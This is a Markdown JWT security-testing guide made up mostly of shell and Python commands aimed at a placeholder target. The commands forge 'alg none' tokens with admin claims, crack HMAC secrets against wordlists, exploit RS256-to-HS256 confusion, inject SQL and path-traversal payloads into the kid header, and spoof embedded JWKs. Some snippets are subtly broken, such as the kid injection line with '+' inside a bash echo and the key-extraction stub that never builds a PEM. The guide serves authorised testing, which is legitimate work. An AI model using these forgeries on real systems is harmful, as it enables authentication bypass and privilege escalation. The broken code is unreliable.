# JWT Security Testing

## Objective

Identify JWT implementation flaws that allow token forgery, algorithm confusion, claim manipulation, or signature bypass — enabling privilege escalation or authentication bypass.

---

## 1. JWT Recon — Decode and Analyze

### Decode Without Verification
```bash
# Extract JWT from browser (Cookie, Authorization header, or localStorage)
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0IiwicCI6InVzZXIiLCJleHAiOjE3MDAwMDB9.SIGNATURE"

# Decode header and payload (no verification)
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

### What to Note
- `alg` value in header
- `typ` value
- All claims in payload: `sub`, `role`, `email`, `exp`, `iss`, `aud`, `permissions`
- Token expiry (`exp`) and issued-at (`iat`)
- Any custom claims that look security-relevant

---

## 2. Algorithm: None Attack

Change the algorithm to `none` and remove the signature.

```bash
# Original header: {"alg":"HS256","typ":"JWT"}
# Modified header: {"alg":"none","typ":"JWT"}

HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')

# Original payload — modify role or other claims
PAYLOAD=$(echo -n '{"sub":"1234","role":"admin","exp":9999999999}' | base64 | tr -d '=' | tr '/+' '_-')

# Construct token with empty signature
FORGED="$HEADER.$PAYLOAD."
echo "Forged token: $FORGED"

# Test
curl -si https://target/api/admin/users \
  -H "Authorization: Bearer $FORGED" | grep HTTP
```

**Variations to try:**
- `"alg":"none"`
- `"alg":"None"`
- `"alg":"NONE"`
- `"alg":"nOnE"`

---

## 3. Weak Secret Brute Force

If algorithm is `HS256`, `HS384`, or `HS512`, attempt to crack the HMAC secret.

```bash
# Using hashcat
hashcat -a 0 -m 16500 $TOKEN /usr/share/wordlists/rockyou.txt

# Using jwt_tool
python3 jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Common weak secrets to test manually
for SECRET in "secret" "password" "jwt_secret" "supersecret" "changeme" "12345678" "$APP_NAME"; do
  python3 -c "
import hmac, hashlib, base64
parts = '$TOKEN'.split('.')
sig = hmac.new(b'$SECRET', (parts[0]+'.'+parts[1]).encode(), hashlib.sha256).digest()
expected = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f'Secret: $SECRET → Match: {expected == parts[2]}')
"
done
```

If secret is found, forge a token with elevated privileges.

---

## 4. RS256 to HS256 Algorithm Confusion

If server uses RS256, it has a public key. An attacker can forge a HS256 token using the public key as the HMAC secret.

```bash
# Step 1: Obtain the server's public key
curl -s https://target/.well-known/jwks.json
# or from error pages, /api/auth/public-key, SSL certificate

# Step 2: Convert public key PEM to a single line
PUB_KEY=$(curl -s https://target/.well-known/jwks.json | python3 -c "
import sys, json, base64
jwks = json.load(sys.stdin)
# Extract n and e and reconstruct PEM
print('Public key extracted')
")

# Step 3: Use jwt_tool for algorithm confusion
python3 jwt_tool.py $TOKEN -X k -pk public_key.pem
```

---

## 5. JWT Claim Tampering

If signature validation is weak, tamper with claims:

### Role Escalation
```bash
# Original: {"sub":"1234","role":"user","exp":1700000000}
# Modified: {"sub":"1234","role":"admin","exp":9999999999}

# Using jwt_tool
python3 jwt_tool.py $TOKEN -T  # interactive tamper mode

# Manual base64 modification
PAYLOAD=$(echo -n '{"sub":"1234","role":"admin","exp":9999999999}' \
  | base64 | tr -d '=' | tr '/+' '_-')
```

### `kid` Header Injection
Some implementations use the `kid` (key ID) claim to look up the signing key from a database:

```bash
# SQL injection in kid
HEADER=$(echo -n '{"alg":"HS256","typ":"JWT","kid":"' + "' UNION SELECT 'attackerkey' -- " + '"}' \
  | base64 | tr -d '=' | tr '/+' '_-')

# Path traversal in kid
HEADER=$(echo -n '{"alg":"HS256","typ":"JWT","kid":"/dev/null"}' \
  | base64 | tr -d '=' | tr '/+' '_-')
# Then sign with empty string as secret
```

---

## 6. JWT Expiry Testing

```bash
# Collect an expired token (wait for expiry, or modify exp claim)
# Test if expired tokens are accepted
curl -si https://target/api/me \
  -H "Authorization: Bearer EXPIRED_TOKEN" | grep HTTP
```

**Vulnerable:** If HTTP 200 returned for expired token.

---

## 7. JWT Revocation / Logout Testing

```bash
# Step 1: Capture current valid JWT
TOKEN="current_valid_token"

# Step 2: Logout
curl -si -X POST https://target/api/logout \
  -H "Authorization: Bearer $TOKEN" | grep HTTP

# Step 3: Re-use the token
curl -si https://target/api/me \
  -H "Authorization: Bearer $TOKEN" | grep HTTP
```

**Vulnerable:** If the original token still returns 200 after logout.

---

## 8. JWK Header Injection (JWKS Spoofing)

```bash
# Inject a custom jwk into the JWT header pointing to attacker-controlled key
HEADER=$(echo -n '{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "ATTACKER_PUBLIC_KEY_N",
    "e": "AQAB"
  }
}' | base64 | tr -d '=' | tr '/+' '_-')
# Sign with attacker's private key
```

---

## Evidence to Capture

- Original JWT (decoded header + payload)
- Forged JWT header + payload
- Request with forged JWT
- Response showing unauthorized access or privilege escalation

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| Algorithm none attack | Pass/Fail | Critical |
| Weak HMAC secret | Pass/Fail | Critical |
| RS256 to HS256 confusion | Pass/Fail | Critical |
| Role/privilege claim tampering | Pass/Fail | Critical |
| kid SQL/path injection | Pass/Fail | High-Critical |
| Expired token accepted | Pass/Fail | Medium |
| Token reuse after logout | Pass/Fail | High |
| JWK header injection | Pass/Fail | Critical |
